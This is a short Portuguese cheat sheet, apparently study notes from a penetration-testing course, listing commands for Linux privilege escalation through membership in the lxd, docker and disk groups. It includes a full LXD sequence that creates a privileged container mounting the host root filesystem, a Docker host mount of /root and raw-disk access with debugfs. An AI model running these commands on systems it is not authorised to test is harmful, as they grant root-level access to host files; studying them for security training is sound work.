# Comandos Principais - Privileged Groups

| Comando | Objetivo | Resultado esperado |
|---|---|---|
| `id` | Ver grupos do usuário atual | Identificação de grupos privilegiados (`lxd`, `docker`, `disk`, `adm`) |
| `unzip alpine.zip` | Extrair imagem Alpine para uso no LXD | Arquivos `.tar.gz` e `.root` disponíveis |
| `lxd init` | Inicializar configuração do LXD | Ambiente LXD configurado (ou erro que indica limitações) |
| `lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine` | Importar imagem local no LXD | Imagem registrada com alias `alpine` |
| `lxc init alpine r00t -c security.privileged=true` | Criar container privilegiado | Instância criada sem mapeamento restritivo de UID |
| `lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true` | Montar filesystem do host no container | Host visível em `/mnt/root` dentro do container |
| `lxc start r00t` | Iniciar o container criado | Container em execução |
| `lxc exec r00t /bin/sh` | Abrir shell dentro do container | Shell interativo com privilégios elevados no contexto do container |
| `docker run -v /root:/mnt -it ubuntu` | Montar `/root` do host via Docker | Acesso ao conteúdo de `/root` do host dentro do container |
| `debugfs /dev/sda1` | Acessar sistema de arquivos por dispositivo (grupo `disk`) | Leitura/inspeção de dados sensíveis no disco |

